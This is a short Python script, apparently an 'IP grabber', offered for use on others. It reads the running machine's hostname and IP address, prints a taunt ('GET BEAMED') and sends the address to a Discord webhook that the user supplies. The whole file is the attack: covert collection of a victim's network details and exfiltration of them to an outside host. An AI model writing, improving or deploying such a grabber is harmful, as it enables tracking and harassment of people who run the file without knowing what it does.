import time
import socket
from discord_webhook import DiscordWebhook
# MAKE SURE YOU READ THE READ ME FILE BEFORE USING THIS
time.sleep(1)
hostname = socket.gethostname()
IP = socket.gethostbyname(hostname)
url = ('your webhook url here')
print ("LMFAO GET BEAMED, " + IP)
webhook = DiscordWebhook(url = url, content = ('Users ip: ' + IP))
response = webhook.execute()
